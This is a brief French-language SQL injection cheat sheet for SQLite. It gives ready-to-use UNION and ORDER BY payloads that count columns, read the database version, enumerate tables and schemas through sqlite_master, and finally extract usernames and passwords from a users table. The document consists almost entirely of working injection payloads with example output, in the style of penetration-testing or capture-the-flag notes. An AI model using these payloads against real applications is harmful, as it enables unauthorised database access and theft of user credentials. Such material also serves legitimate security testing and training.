# SQLite

## Déterminer le nombre de colonnes

#### UNION

```sql
' UNION SELECT 1-- -  # erreur
' UNION SELECT 1, null-- - # pas d'erreur, il y a donc deux colonnes
```

#### ORDER BY

```sql
' ORDER BY 1-- - # pas d'erreur
' ORDER BY 2-- - # pas d'erreur
' ORDER BY 3-- - # Erreur, il y a donc deux colonnes
```

## Retrouver la version de la base de données

```sql
' UNION SELECT 1, sqlite_version()-- -
```

## Lister les tables

```sql
' UNION SELECT 1, name FROM sqlite_master WHERE type='table'-- - 
# Output : foo, users
```

## Retrouver le format des tables

```sql
' UNION SELECT 1, sql FROM sqlite_master WHERE tbl_name = 'users' AND type = 'table'-- - 
# Output : CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
```

## Extraction

```sql
' UNION SELECT username, password FROM users-- -
```
